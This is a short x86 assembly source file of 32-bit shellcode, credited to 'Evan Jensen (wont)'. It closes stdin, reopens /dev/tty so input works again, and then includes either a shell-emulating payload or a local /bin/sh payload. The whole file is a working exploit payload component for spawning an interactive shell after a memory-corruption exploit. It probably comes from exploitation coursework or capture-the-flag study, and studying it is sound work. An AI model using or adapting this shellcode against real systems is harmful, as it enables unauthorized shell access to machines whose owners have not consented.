	;; Shellcode that will reattatch to stdin
	;; Evan Jensen (wont) 111012
BITS 32
	
%include "short32.s"
%include "syscall.s"
	global main

main:
_close:
	xor eax,eax
	xor ebx,ebx
	SYSTEM_CALL(close) 	;close(STDIN_FILENO)
tty:
	push ebx
	push 0x7974742f
	push 0x7665642f
	mov ebx,esp 		;/dev/tty
	xor ecx,ecx
	mov cl,2		;O_RDRW
	SYSTEM_CALL(open)	;open("/dev/tty",O_RDRW);

	;; Any local shellcode here
	
%define EMULATOR
%ifdef 	EMULATOR
	;; shell emulating shellcode
	incbin "../32shellEmulator/shellcode"
%else
	;; ordinary shellcode (/bin/sh)
	incbin "../32bitLocalBinSh/shellcode"
%endif